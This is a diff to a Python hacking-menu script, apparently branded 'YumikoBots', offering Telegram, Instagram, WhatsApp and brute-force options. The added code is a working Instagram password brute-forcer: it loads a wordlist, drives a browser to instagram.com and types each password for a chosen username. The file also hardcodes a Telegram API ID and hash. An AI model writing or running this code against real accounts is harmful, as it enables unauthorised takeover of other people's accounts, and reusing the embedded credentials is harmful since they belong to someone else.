@@ -1,6 +1,8 @@
 from pyrogram import Client as yumiko, filters as filt
-import pyrogram 
 import os
+import time
+from webbot import Browser
+from pynput.keyboard import Key, Controller
 
 API_ID = 9276915
 API_HASH = "e8145ec48504292485900892fffaf890"
@@ -26,8 +28,7 @@ lightcyan = '\033[96m'
 clear = '\033[0m'
 lgreen = '\033[92m'
 os.system("clear")
-banner = lgreen+'''
-
+banner = lgreen + '''
                          __.oOo.__
                         /'(  _  )`\
                        / . \/^\/ . \
@@ -53,26 +54,31 @@ Yb, `88        88                                       IP'`Yb
         Y8,_ _,88                                                              
          "Y888P"  
 Version: v1.0.0         Developed By: YumikoBots         Owner: Santhu Tech
-'''+clear
+''' + clear
 print(" ")
 print(banner)
+
 
 def show_options(title, options):
     print(title)
     for i, option in enumerate(options):
-        print(f"{i+1}. {option}")
+        print(f"{i + 1}. {option}")
+
 
 def clear_screen():
-    if os.name == 'nt': 
+    if os.name == 'nt':
         _ = os.system('cls')
     else:  # For Linux and Mac
         _ = os.system('clear')
 
+
 def whatsapp():
     print("Launching Whatsapp...")
 
+
 def bruteforce():
     print("Launching Bruteforce...")
+
 
 def telegram():
     while True:
@@ -98,6 +104,7 @@ def telegram():
             print("Invalid choice. Please try again.")
             input("Press Enter to continue...")
 
+
 def instagram():
     while True:
         clear_screen()
@@ -105,6 +112,35 @@ def instagram():
         choice = input("Enter your choice (1-4): ")
         if choice == "1":
             print("Launching Instagram Brute Force Passwords...")
+            username = input('Username: ')
+            dictionary = input('Choose Dictionary: ')
+
+            file = open(f'{dictionary}.txt', 'r')
+            bruteforce = []
+            for line in file:
+                line = line.strip()
+                bruteforce.append(line)
+            file.close()
+
+            web = Browser()
+            keyboard = Controller()
+
+            web.go_to('www.instagram.com')
+            time.sleep(3)
+            keyboard.press(Key.enter)
+            keyboard.release(Key.enter)
+            time.sleep(3)
+            keyboard.press(Key.tab)
+            keyboard.release(Key.tab)
+            time.sleep(3)
+            web.type(username)
+            keyboard.press(Key.tab)
+            keyboard.release(Key.tab)
+            for brute in bruteforce:
+                web.type(brute, into="Password")
+                keyboard.press(Key.enter)
+                keyboard.release(Key.enter)
+
             input("Press Enter to continue...")
         elif choice == "2":
             print("Launching Instagram Account Hack...")
@@ -118,6 +154,7 @@ def instagram():
         else:
             print("Invalid choice. Please try again.")
             input("Press Enter to continue...")
+
 
 clear_screen()
 menu_options = ["Telegram", "Instagram", "WhatsApp", "Brute Force"]
